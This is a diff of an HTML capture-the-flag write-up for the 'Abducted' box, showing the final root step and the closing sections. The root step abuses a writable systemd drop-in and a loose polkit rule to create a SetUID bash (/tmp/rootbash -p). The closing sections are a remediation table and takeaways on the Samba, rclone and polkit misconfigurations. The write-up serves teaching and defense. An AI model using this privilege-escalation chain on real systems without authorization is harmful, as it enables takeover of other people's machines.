+<span class="p">$</span> systemctl restart smbd</code></pre>
+
+  <p>The <code>restart</code> needs the unit-management action (<code>manage-units</code>), which is
+  separate from the reload - so watch this one too. No prompt means it's also granted, and <code>smbd</code>
+  restarting fires our <code>ExecStartPre</code> as root, creating the SetUID bash.</p>
+
+  <h3>Collect root</h3>
+
+  <pre><code><span class="p">$</span> /tmp/rootbash -p
+<span class="p">$</span> id</code></pre>
+
+  <p><code>-p</code> keeps the SetUID euid instead of dropping it. Your real uid still shows marcus -
+  that's normal for a SetUID shell; <code>euid=0(root)</code> is what matters.</p>
+
+  <figure><img src="images/Abducted/adb28.png" alt="rootbash -p giving a shell with euid=0 root"><figcaption><code>/tmp/rootbash -p</code> &rarr; <code>euid=0(root)</code>. Full chain from <code>nobody</code> to root.</figcaption></figure>
+
+  <p>And the root flag:</p>
+
+  <pre><code>rootbash-5.2# cat /root/root.txt</code></pre>
+
+  <figure><img src="images/Abducted/adb29.png" alt="root.txt flag redacted"><figcaption>Root flag - <code>/root/root.txt</code> [redacted]</figcaption></figure>
+
+  <p>One last thing, now that we're root - we can finally read the polkit rule that was locked away in
+  the root-only <code>/etc/polkit-1/rules.d/</code>, and confirm the answer we inferred earlier instead
+  of just trusting it:</p>
+
+  <pre><code><span class="p">#</span> cat /etc/polkit-1/rules.d/*.rules</code></pre>
+
+  <figure><img src="images/Abducted/adb30.png" alt="the custom polkit rule granting operators the reload-daemon action"><figcaption>The custom rule, read as root - it confirms the <code>reload-daemon</code> answer. There are multiple ways to reach the same conclusion; this is just the most direct proof.</figcaption></figure>
+
+  <div class="note">
+    <span class="lbl">engagement hygiene</span>
+    <code>pwn.conf</code> and <code>/tmp/rootbash</code> are artifacts we dropped. In a real engagement
+    you'd log them in the report and clean them up afterward - a group-writable unit drop-in and a
+    world-executable SetUID bash are exactly the kind of thing you don't want to leave behind.
+  </div>
 
   <hr>
 
+  <!-- ==================== 06 ==================== -->
   <h2><span class="num">06</span>Root cause &amp; remediation</h2>
+
   <table style="width:100%; border-collapse:collapse; font-size:14.5px; margin:6px 0 8px">
     <tbody>
       <tr style="border-bottom:1px solid var(--border)">
-        <td style="padding:11px 12px 11px 0; color:var(--text); width:40%"><strong>Samba print injection</strong><br><span style="color:var(--text-4);font-size:13px">CVE-2026-4480</span></td>
-        <td style="padding:11px 0; color:var(--text-3)" class="prompt">Patch Samba; avoid passing %J to a shell; disable unused printer shares.</td>
+        <td style="padding:11px 12px 11px 0; color:var(--text); width:40%"><strong>Samba print injection</strong><br><span style="color:var(--text-4);font-size:13px">CVE-2026-4480 &middot; CWE-78</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Patch Samba. Never pass the <code>%J</code> job name to a shell command unescaped; disable unused printer shares and lock down anonymous access to the spooler.</td>
       </tr>
       <tr style="border-bottom:1px solid var(--border)">
-        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Reused / recoverable creds</strong></td>
-        <td style="padding:11px 0; color:var(--text-3)" class="prompt">rclone obfuscation isn't encryption; unique per-account creds; secrets management.</td>
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Reused / recoverable creds</strong><br><span style="color:var(--text-4);font-size:13px">rclone-obscured password reused for scott</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">rclone obfuscation is not encryption - treat any obscured secret as plaintext. Use unique per-account credentials, keep config files owner-only (<code>0600</code>), and move secrets into a real secrets manager.</td>
       </tr>
       <tr style="border-bottom:1px solid var(--border)">
-        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Samba wide links</strong></td>
-        <td style="padding:11px 0; color:var(--text-3)" class="prompt">Disable wide links / insecure wide links; don't force-user across trust boundaries.</td>
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Samba wide links</strong><br><span style="color:var(--text-4);font-size:13px">force user across a trust boundary</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Disable <code>wide links</code> / <code>allow insecure wide links</code>. Don't combine <code>force user</code> with a writable share that another user controls on disk - it lets one account act as another.</td>
       </tr>
       <tr>
-        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Writable systemd drop-in + polkit grant</strong></td>
-        <td style="padding:11px 0; color:var(--text-3)" class="prompt">No group-writable unit dirs; scope polkit rules tightly; don't let a service restart become a root primitive.</td>
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Writable systemd drop-in + loose polkit rule</strong><br><span style="color:var(--text-4);font-size:13px">operators group + no-auth reload/restart</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Keep unit and drop-in directories root-owned and not group-writable. Scope polkit rules tightly (specific action, specific admin subject, require auth), and don't let a service restart become a root-code-execution primitive.</td>
       </tr>
     </tbody>
   </table>
 
   <hr>
 
-  <h2><span class="num">07</span>Takeaways</h2>
-  <p class="prompt">What this box drills: don't take the bait (weak-policy != brute-force), read
-  release/retire timing as a CVE hint, and how a chain of small Linux/Samba misconfigs compounds into
-  full compromise. What you'd do faster next time.</p>
+  <!-- ==================== 07 ==================== -->
+  <h2><span class="num">07</span>Summary &amp; takeaways</h2>
+
+  <p>Abducted is a five-step chain and every link is one small misconfiguration handing off to the next:
+  an anonymous print share &rarr; command injection (CVE-2026-4480) for a shell as <code>nobody</code>
+  &rarr; a world-readable rclone config whose "obscured" password decodes and is reused for
+  <code>scott</code> &rarr; a <code>force user</code> + <code>wide links</code> Samba share abused to
+  plant an SSH key and become <code>marcus</code> &rarr; a group-writable systemd drop-in plus a loose
+  polkit rule to run code as root. No brute-force anywhere.</p>
+
+  <p><strong>Read the box name and the recon signals as hints.</strong> "Abducted" was a nudge, and an
+  anonymously-mappable printer share on a Samba box is unusual enough to point straight at a print-spooler
+  CVE rather than a password attack.</p>
+
+  <p><strong>Obfuscation is not encryption.</strong> rclone's <code>obscure</code> is reversible with a
+  public algorithm - if a low-priv user can read the config, the secret is already gone. And any
+  credential you find is a candidate for reuse everywhere else; the service password just happened to be
+  scott's too.</p>
+
+  <p><strong>Small config choices compound.</strong> <code>wide links</code> alone is a read/write
+  primitive; <code>force user</code> alone is an identity swap; together they're lateral movement. A
+  group-writable unit dir alone is harmless; a polkit rule ungating <code>daemon-reload</code> alone is
+  harmless; together they're root. Chaining is where the real severity lives.</p>
+
+  <p><strong>Verify, don't assume.</strong> We checked the drop-in directory's actual permission bits
+  before relying on them, and we proved the polkit rule by watching <code>daemon-reload</code> run without
+  a prompt rather than taking it on faith - then confirmed the rule text itself once we were root. That's
+  the discipline that keeps a finding defensible when a client pushes back.</p>
 
   <p style="margin-top:32px">
     <a href="writeups.html">&larr; all write-ups</a> &nbsp;&middot;&nbsp;
